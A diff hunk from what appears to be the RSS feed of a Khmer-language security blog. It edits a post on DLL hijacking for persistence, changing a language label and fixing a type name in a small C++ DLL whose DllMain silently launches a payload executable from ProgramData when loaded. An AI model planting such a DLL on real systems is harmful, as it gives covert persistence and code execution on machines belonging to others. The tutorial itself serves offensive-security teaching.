@@ -416,8 +416,8 @@ Shellcode ខាងក្រោមជាដំណើរការបង្កើ�
         <author>thiklife403@gmail.com (Thik)</author>
         <atom:modified>Tue, 06 Dec 2022 21:01:06 +0700</atom:modified>
         <guid>https://thiklab.com/en/posts/dll-hijacking-persistence-method/</guid>
-        <description>C - Execute Command Prompt ចម្លងកូដ និង កែប្រែទីតាំងរបស់ Payload​ ។
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  #include &amp;lt;windows.h&amp;gt;using namespace std; void exec() { WinExec(&amp;#34;cmd.exe /c c:\\programdata\\putty.exe&amp;#34;, 0); } BOOL WINAPI DllMain (HANDLE hDLL, DWORD dwReason, LYVOID lpReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: exec(); break; } return TRUE; }  
+        <description>CPP - Execute Command Prompt ចម្លងកូដ និង កែប្រែទីតាំងរបស់ Payload​ ។
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  #include &amp;lt;windows.h&amp;gt;using namespace std; void exec() { WinExec(&amp;#34;cmd.exe /c c:\\programdata\\putty.exe&amp;#34;, 0); } BOOL WINAPI DllMain (HANDLE hDLL, DWORD dwReason, LPVOID lpReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: exec(); break; } return TRUE; }  
 យោងតាម៖ dllmain
 DLL Build ចូលទៅកាន់ផ្ទាំង Terminal ក្នុងប្រព័ន្ធប្រតិបត្តិការលីនុច រួចវាយពាក្យបញ្ជាដូខខាងក្រោម៖</description>
         
